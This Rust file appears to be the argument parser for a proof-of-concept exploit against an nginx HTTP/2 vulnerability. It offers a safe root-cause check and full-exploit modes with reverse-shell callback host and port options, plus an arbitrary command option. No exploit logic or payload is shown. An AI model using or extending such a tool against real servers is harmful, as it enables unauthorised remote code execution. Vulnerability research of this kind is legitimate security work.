use std::net::IpAddr;
use std::path::PathBuf;
use std::time::Duration;

use anyhow::{bail, Result};
use clap::Parser;

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Mode {
    Safe,
    Shell,
    Exploit,
}

#[derive(Clone, Debug, Parser)]
#[command(name = "poc", about = "CVE-2026-123007 nginx HTTP/2 proof of concept")]
pub struct Args {
    /// Target HTTPS origin, e.g. https://host[:port]/[path]
    #[arg(long, conflicts_with_all = ["targets", "hosts"])]
    pub host: Option<String>,
    /// Several HTTPS origins (repeatable), for --safe.
    #[arg(long, value_name = "URL", conflicts_with_all = ["targets", "host"])]
    pub hosts: Vec<String>,
    /// File with one HTTPS origin per line (for --safe); # comments allowed.
    #[arg(long, conflicts_with_all = ["host", "hosts"])]
    pub targets: Option<PathBuf>,
    /// Prove the root cause only; no heap corruption. (alias: --proof)
    #[arg(long, visible_alias = "proof")]
    pub safe: bool,
    /// Full exploit plus reverse-shell command verification.
    #[arg(long)]
    pub shell: bool,
    /// Full exploit; prints the reverse-shell payload and listener command.
    #[arg(long)]
    pub exploit: bool,
    /// Callback address for the reverse shell.
    #[arg(long)]
    pub lhost: Option<IpAddr>,
    /// Callback port.
    #[arg(long, default_value_t = 4444)]
    pub lport: u16,
    /// Command to execute instead of the default reverse shell.
    #[arg(long)]
    pub cmd: Option<String>,
    /// Resource used by --safe (default: the path in --host, else /index.html).
    #[arg(long)]
    pub path: Option<String>,
    /// auto, a built-in profile name, or a profile JSON path.
    #[arg(long, default_value = "auto")]
    pub profile: String,
    /// Relay stdin/stdout after --shell verification.
    #[arg(long)]
    pub interactive: bool,
    /// Absolute receive timeout for stage waits, in seconds.
    #[arg(long)]
    pub timeout: Option<u64>,
    /// Seconds to wait for the callback after dispatch.
    #[arg(long, default_value_t = 180)]
    pub shell_timeout: u64,
    /// Skip the pre-dispatch traffic confirmation prompt.
    #[arg(long)]
    pub yes: bool,
    /// Fine-grained debug logging.
    #[arg(long)]
    pub verbose: bool,
}

impl Args {
    pub fn mode(&self) -> Result<Mode> {
        let count = [self.safe, self.shell, self.exploit].iter().filter(|x| **x).count();
        if count > 1 {
            bail!("--safe, --shell and --exploit are mutually exclusive");
        }
        Ok(match (self.safe, self.shell, self.exploit) {
            (true, _, _) => Mode::Safe,
            (_, true, _) => Mode::Shell,
            (_, _, true) => Mode::Exploit,
            // No mode flag means the cheap, safe check.
            _ => Mode::Safe,
        })
    }
}

pub fn parse() -> ParsedArgs {
    let args = Args::parse();
    let sources = [
        args.host.is_some(),
        !args.hosts.is_empty(),
        args.targets.is_some(),
    ]
    .iter()
    .filter(|present| **present)
    .count();
    if sources != 1 {
        eprintln!("poc: give exactly one of --host, --hosts or --targets");
        std::process::exit(2);
    }
    let mode = args.mode().unwrap_or_else(|e| {
        eprintln!("poc: {e}");
        std::process::exit(2);
    });
    if mode == Mode::Shell && args.lhost.is_none() {
        eprintln!("poc: --shell requires --lhost");
        std::process::exit(2);
    }
    if let Some(cmd) = &args.cmd {
        if cmd.as_bytes().contains(&0) {
            eprintln!("poc: --cmd must not contain NUL");
            std::process::exit(2);
        }
    }
    let timeout = args.timeout.map(Duration::from_secs);
    ParsedArgs { host: args.host.clone(), mode, args, timeout }
}

#[allow(dead_code)]
pub struct ParsedArgs {
    pub host: Option<String>,
    pub mode: Mode,
    pub args: Args,
    pub timeout: Option<Duration>,
}

#[cfg(test)]
mod tests {
    use super::*;

    fn args(extra: &[&str]) -> Args {
        let mut argv = vec!["poc", "--host", "https://example.com"];
        argv.extend_from_slice(extra);
        Args::try_parse_from(argv).unwrap()
    }

    #[test]
    fn defaults_to_safe() {
        assert_eq!(args(&[]).mode().unwrap(), Mode::Safe);
    }

    #[test]
    fn rejects_two_modes() {
        assert!(args(&["--safe", "--shell"]).mode().is_err());
    }

    #[test]
    fn shell_needs_lhost() {
        let parsed = args(&["--shell"]);
        assert_eq!(parsed.mode().unwrap(), Mode::Shell);
        assert!(parsed.lhost.is_none());
    }

    #[test]
    fn rejects_nul_command() {
        assert!("a\0b".as_bytes().contains(&0));
    }
}
